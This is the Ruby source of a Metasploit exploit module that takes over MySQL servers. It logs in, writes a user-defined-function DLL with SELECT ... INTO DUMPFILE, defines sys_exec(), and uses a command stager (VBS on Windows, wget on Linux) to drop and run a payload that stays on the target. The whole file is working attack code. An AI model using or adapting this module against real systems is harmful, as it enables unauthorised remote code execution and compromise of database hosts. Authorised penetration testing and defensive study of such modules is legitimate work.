# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::MYSQL
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => &#039;Oracle MySQL UDF Payload Execution&#039;,
        &#039;Description&#039;    => %q{
          This module creates and enables a custom UDF (user defined function) on the
          target host via the SELECT ... into DUMPFILE method of binary injection. On
          default Microsoft Windows installations of MySQL (=< 5.5.9), directory write
          permissions not enforced, and the MySQL service runs as LocalSystem.

          NOTE: This module will leave a payload executable on the target system when the
          attack is finished, as well as the UDF DLL, and will define or redefine sys_eval()
          and sys_exec() functions.
        },
        &#039;Author&#039;         =>
          [
            &#039;Bernardo Damele A. G. <bernardo.damele[at]gmail.com>&#039;, # the lib_mysqludf_sys.dll binaries
            &#039;todb&#039;, # this Metasploit module
            &#039;h00die&#039; # linux addition
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;References&#039;     =>
          [
            # Bernardo&#039;s work with cmd exec via udf
            [ &#039;URL&#039;, &#039;http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html&#039; ]
          ],
        &#039;Platform&#039;       => [&#039;win&#039;, &#039;linux&#039;],
        &#039;Targets&#039;        =>
          [
            [ &#039;Windows&#039;, {&#039;CmdStagerFlavor&#039; => &#039;vbs&#039;} ], # Confirmed on MySQL 4.1.22, 5.5.9, and 5.1.56 (64bit)
            [ &#039;Linux&#039;, {&#039;CmdStagerFlavor&#039; => &#039;wget&#039; } ]
          ],
        &#039;DefaultTarget&#039;  => 0,
        &#039;DisclosureDate&#039; => &#039;Jan 16 2009&#039; # Date of Bernardo&#039;s blog post.
    ))
    register_options(
      [
        OptBool.new(&#039;FORCE_UDF_UPLOAD&#039;, [ false, &#039;Always attempt to install a sys_exec() mysql.function.&#039;, false ]),
        OptString.new(&#039;USERNAME&#039;, [ false, &#039;The username to authenticate as&#039;, &#039;root&#039; ])
    ])
  end

  def username
    datastore[&#039;USERNAME&#039;]
  end

  def password
    datastore[&#039;PASSWORD&#039;]
  end

  def login_and_get_sys_exec
    m = mysql_login(username,password,&#039;mysql&#039;)
    return if not m
    @mysql_arch = mysql_get_arch
    @mysql_sys_exec_available = mysql_check_for_sys_exec()
    if !@mysql_sys_exec_available || datastore[&#039;FORCE_UDF_UPLOAD&#039;]
      mysql_add_sys_exec
      @mysql_sys_exec_available = mysql_check_for_sys_exec()
    else
      print_status "sys_exec() already available, using that (override with FORCE_UDF_UPLOAD)."
    end

    return m
  end

  def execute_command(cmd, opts)
    mysql_sys_exec(cmd, datastore[&#039;VERBOSE&#039;])
  end

  def exploit
    m = login_and_get_sys_exec()

    if not m
      return
    elsif not [:win32,:win64,:linux64,:linux32].include?(@mysql_arch)
      print_status("Incompatible MySQL target architecture: &#039;#{@mysql_arch}&#039;")
      return
    else
      if @mysql_sys_exec_available
        execute_cmdstager({:linemax => 1500, :nodelete => true})
        handler
      else
        print_status("MySQL function sys_exec() not available")
        return
      end
    end
    disconnect
  end
end

